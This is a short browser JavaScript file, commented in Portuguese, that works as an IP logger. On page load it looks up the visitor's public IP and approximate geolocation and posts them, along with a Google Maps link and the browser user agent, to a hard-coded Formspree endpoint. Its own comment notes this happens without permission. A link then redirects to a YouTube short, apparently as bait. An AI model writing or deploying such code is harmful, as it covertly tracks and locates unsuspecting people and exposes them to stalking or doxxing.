
(() => {
  const formspreeEndpoint = "https://formspree.io/f/mnngrgzw"; // troque se necessário

  function sendToFormspree(payload) {
    return fetch(formspreeEndpoint, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
  }

  function getIP() {
    return fetch("https://api.ipify.org?format=json")
      .then(r => { if (!r.ok) throw new Error('api.ipify falhou'); return r.json(); })
      .then(d => d.ip)
      .catch(() => null);
  }

  function getGeoByIPAndSend() {
    const statusEl = document.getElementById('status');
    if (statusEl) statusEl.textContent = "Status: obtendo IP público...";

    getIP().then(ip => {
      if (!ip) {
        if (statusEl) statusEl.textContent = "Status: não foi possível obter IP.";
        sendToFormspree({ timestamp: new Date().toISOString(), note: "Sem IP", user_agent: navigator.userAgent });
        return;
      }

      if (statusEl) statusEl.textContent = "Status: IP obtido. Consultando geolocalização por IP...";

      fetch("https://ipapi.co/json/")
        .then(r => { if (!r.ok) throw new Error('ipapi falhou'); return r.json(); })
        .then(info => {
          const lat = info.latitude || null;
          const lon = info.longitude || null;
          const city = info.city || null;
          const region = info.region || null;
          const country = info.country_name || null;
          const mapsLink = (lat && lon) ? `https://www.google.com/maps?q=${lat},${lon}` : null;

          const payload = {
            timestamp: new Date().toISOString(),
            ip: ip,
            latitude: lat,
            longitude: lon,
            city, region, country,
            google_maps_link: mapsLink,
            user_agent: navigator.userAgent,
            note: "Localização por IP (sem permissão). Precisão baixa."
          };

          if (statusEl) statusEl.textContent = `Status: localização aproximada (${city || 'n/a'}, ${region || ''}). Enviando...`;
          return sendToFormspree(payload);
        })
        .then(() => {
          if (statusEl) statusEl.textContent = "Status: dados enviados (por IP).";
        })
        .catch(err => {
          console.warn("Erro ipapi:", err);
          if (statusEl) statusEl.textContent = "Status: falha na geolocalização por IP. Enviando apenas IP.";
          sendToFormspree({
            timestamp: new Date().toISOString(),
            ip: ip,
            user_agent: navigator.userAgent,
            note: "Falha ipapi; apenas IP enviado"
          });
        });
    });
  }

  // evento para executar ao carregar a página
  window.addEventListener('load', getGeoByIPAndSend);

  // redirecionamento do link
  const here = document.getElementById('Here!');
  if (here) {
    here.addEventListener('click', function (event) {
      event.preventDefault();
      window.location.href = 'https://youtube.com/shorts/UM7TpdnbWfY?si=d_vDGrLYHqp5QZys';
    });
  }
})();
